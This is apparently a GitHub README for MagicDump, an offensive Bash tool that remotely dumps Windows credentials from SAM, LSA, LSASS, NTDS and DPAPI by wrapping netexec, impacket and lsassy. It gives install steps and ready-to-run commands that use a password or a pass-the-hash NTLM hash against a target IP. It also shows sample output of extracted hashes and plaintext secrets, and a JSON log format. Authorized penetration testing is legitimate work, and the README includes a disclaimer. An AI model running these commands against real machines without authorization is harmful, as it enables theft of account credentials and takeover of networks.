# MagicDump

MagicDump is an automated tool designed to remotely dump credentials from Windows machines, including SAM, LSA, LSASS, NTDS, and DPAPI. It simplifies the process of extracting sensitive information, providing organized output and support for multiple authentication methods.

<br>

---

<br>

## Features
- **Credential Dumping**: Automates dumping of SAM, LSA, LSASS, NTDS, and DPAPI credentials.
- **Flexible Authentication**:
  - Username and Password Authentication.
  - Pass-the-Hash Authentication. 
  - (Upcoming) Pass-the-Ticket Authentication.
- **Organized Output**:
  - Logs actions in JSON format.
  - Saves dumps and logs to `~/.magicdump/`.
- **Real-Time Feedback**: Displays actions on the screen as they happen.

<br>

---

<br>

## Requirements
- Bash Shell
- Tools for credential dumping (e.g., `impacket`, `netexec`, etc.)

<br>

---

<br>

## Installation
Clone the repository:
```bash
git clone https://github.com/Mag1cByt3s/MagicDump.git
cd MagicDump
```

<br>

Make the script executable:
```bash
chmod +x MagicDump
```

<br>

---

<br>

## Usage
Run the script with the required options:
```bash
./MagicDump -t <target_ip> -u <username> [-p <password> | -H <hash>] [--local-auth] [-v]
```

<br>

### Arguments
`-t` / `--target`: Specify the target IP address of the Windows machine.
`-u` / `--username`: Specify the username to authenticate as.
`-p` / `--password`: Specify the password for authentication.
`-H` / `--hash`: Specify the NTLM hash for Pass-the-Hash authentication.
`--local-auth`: Use local authentication (optional).
`-v` / `--verbose`: Enable verbose output for debugging (optional).
`-h` / `--help`: Show usage info

<br>

---

<br>

## Examples
```bash
./MagicDump -t 192.168.1.100 -u administrator -p SuperSecretPass123
```

```bash
./MagicDump -t 192.168.1.100 -u administrator -H '0123456789abcdef0123456789abcdef'
```

<br>

Output:
```bash
==============================
       MagicDump v1.0       
==============================
[INFO] Starting MagicDump against target 192.168.1.100
[INFO] Authenticating as user 'administrator'...
[INFO] Starting SAM dump using netexec...
[LOG] Operation: SAM, Status: success
[INFO] SAM dump saved to ~/.magicdump/dumps/192.168.1.100/SAM_dump_192.168.1.100.txt
[SAM HASHES FOUND]:
SMB                      192.168.1.100    445    HOST               administrator:500:aad3b435b51404eeaad3b435b51404ee:0123456789abcdef0123456789abcdef:::
SMB                      192.168.1.100    445    HOST               Guest:501:aad3b435b51404eeaad3b435b51404ee:abcdefabcdefabcdefabcdefabcdef:::
SMB                      192.168.1.100    445    HOST               DefaultUser:503:aad3b435b51404eeaad3b435b51404ee:deadbeefdeadbeefdeadbeefdeadbeef:::
[INFO] Starting LSA dump using netexec...
[LOG] Operation: LSA, Status: success
[INFO] LSA dump saved to ~/.magicdump/dumps/192.168.1.100/LSA_192.168.1.100.txt
[LSA SECRETS FOUND]:
SMB                      192.168.1.100    445    HOST               EXAMPLE\HOST$:aes256-cts-hmac-sha1-96:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
SMB                      192.168.1.100    445    HOST               EXAMPLE\HOST$:aes128-cts-hmac-sha1-96:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
SMB                      192.168.1.100    445    HOST               EXAMPLE\HOST$:des-cbc-md5:cccccccccccccccc
SMB                      192.168.1.100    445    HOST               EXAMPLE\HOST$:plain_password_hex:d41d8cd98f00b204e9800998ecf8427e
SMB                      192.168.1.100    445    HOST               NL$KM:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
SMB                      192.168.1.100    445    HOST               EXAMPLE\service_user:ServicePass123
[INFO] Starting LSASS dump using lsassy...
[LOG] Operation: LSASS, Status: success
[INFO] LSASS dump saved to ~/.magicdump/dumps/192.168.1.100/LSASS_dump_192.168.1.100.txt
[LSASS CREDENTIALS FOUND]:
EXAMPLE\service_user abcdefabcdefabcdefabcdefabcdefabcdef
[INFO] Dumping complete. Logs saved to ~/.magicdump/logs/192.168.1.100/report_192.168.1.100_20250105080107.json.
```

<br>

---

<br>

## Logfile example

```json
{
  "target_host": "192.168.1.100",
  "operation_time": "2025-01-04T14:00:00Z",
  "credentials_dumped": {
    "SAM": {
      "status": "success",
      "file_path": "/home/user/.magicdump/dumps/SAM_dump_192.168.1.100.txt"
    },
    "LSA": {
      "status": "success",
      "file_path": "/home/user/.magicdump/dumps/LSA_dump_192.168.1.100.txt"
    },
    "NTDS": {
      "status": "success",
      "file_path": "/home/user/.magicdump/dumps/NTDS_dump_192.168.1.100.txt",
      "method": "ntdsutil"
    }
  },
  "warnings": [],
  "logs": [
    "Starting MagicDump against target 192.168.1.100",
    "Authenticating as user 'Administrator'...",
    "Starting SAM dump using netexec...",
    "SAM dump saved to /home/user/.magicdump/dumps/SAM_dump_192.168.1.100.txt",
    "Starting LSA dump using netexec...",
    "LSA dump saved to /home/user/.magicdump/dumps/LSA_dump_192.168.1.100.txt",
    "Starting NTDS dump using ntdsutil...",
    "NTDS dump saved to /home/user/.magicdump/dumps/NTDS_dump_192.168.1.100.txt",
    "Dumping complete. Logs saved to /home/user/.magicdump/logs/report_192.168.1.100_20250104140000.json."
  ]
}
```

<br>

---

<br>

## Roadmap
- Add support for Pass-the-Ticket authentication.
- Integrate more advanced credential dumping techniques.
- Encrypt logs and dumps for security.

<br>

---

<br>

## License
[GPLv3 License](LICENSE)

<br>

---

<br>

## Disclaimer
**MagicDump is intended for authorized use only.** Ensure you have permission before using this tool on any system.
